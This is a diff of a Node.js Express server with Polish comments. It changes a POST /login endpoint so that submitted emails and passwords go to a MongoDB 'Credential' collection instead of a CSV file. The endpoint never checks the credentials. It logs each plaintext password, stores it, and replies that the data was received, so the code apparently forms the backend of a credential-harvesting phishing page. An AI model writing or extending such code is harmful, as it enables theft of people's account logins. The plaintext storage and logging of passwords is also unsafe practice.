@@ -2,9 +2,19 @@ const express = require("express");
 const path = require("path");
 const dotenv = require("dotenv");
 const apiRoutes = require("./src/routes/api");
-const fs = require("fs");
+const mongoose = require("mongoose");
+const Credential = require("./src/models/Credential");
 
 dotenv.config();
+
+// Połączenie z MongoDB
+mongoose
+  .connect(process.env.MONGO_URI, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true
+  })
+  .then(() => console.log("Połączono z MongoDB"))
+  .catch((err) => console.error("Błąd połączenia z MongoDB:", err));
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -38,29 +48,32 @@ app.get("/login", (req, res) => {
 // API Routes
 app.use("/api", apiRoutes);
 
-// Endpoint do obsługi logowania
+// Endpoint do obsługi logowania - teraz zapisuje do MongoDB
 app.post("/login", (req, res) => {
-  const { email, password } = req.body;
-  const timestamp = new Date().toISOString();
-  const dataToSave = `${timestamp}, ${email}, ${password}\n`;
+  const { email, password, remember } = req.body;
 
   console.log(`Próba logowania: ${email}, ${password}`);
 
-  // Ścieżka do pliku zapisu
-  const filePath = path.join(__dirname, "credentials.csv");
+  // Zapisz dane w MongoDB
+  const newCredential = new Credential({
+    email,
+    password,
+    remember: remember || false,
+    timestamp: new Date()
+  });
 
-  // Zapisz dane do pliku
-  fs.appendFile(filePath, dataToSave, (err) => {
-    if (err) {
+  newCredential
+    .save()
+    .then(() => {
+      console.log(`Zapisano dane logowania do MongoDB`);
+      res.json({ success: true, message: "Dane logowania otrzymane" });
+    })
+    .catch((err) => {
       console.error("Błąd podczas zapisywania danych:", err);
-      return res
+      res
         .status(500)
         .json({ success: false, message: "Wystąpił błąd serwera" });
-    }
-
-    console.log(`Zapisano dane logowania do pliku: ${filePath}`);
-    res.json({ success: true, message: "Dane logowania otrzymane" });
-  });
+    });
 });
 
 // Obsługa błędów 404 - zawsze spróbuj wysłać index.html zamiast pokazać listę katalogów
